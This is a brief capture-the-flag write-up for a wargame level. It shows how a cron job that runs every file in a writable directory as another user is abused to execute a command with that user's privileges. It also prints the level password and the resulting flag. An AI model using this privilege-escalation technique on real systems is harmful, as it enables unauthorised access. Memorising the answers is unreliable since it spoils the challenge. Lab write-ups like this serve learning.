username: level05
password: ne2searoevaevoem4ov4ar8ap
---

Found a file containing a crontab, it executes `/usr/sbin/openarenaserver` every two minutes as flag05.

```sh
$ find / -name level05 2>/dev/null 
/var/mail/level05
/rofs/var/mail/level05
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

`/usr/sbin/openarenaserver` executes every file located in `/opt/openarenaserver/`

```
$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

To get the flag we ran the following commands

```
echo 'getflag > /tmp/flag' > /opt/openarenaserver/g
chmod +x /opt/openarenaserver/g
sleep 120 && cat /tmp/flag
```

The flag is: viuaaale9huek52boumoomioc
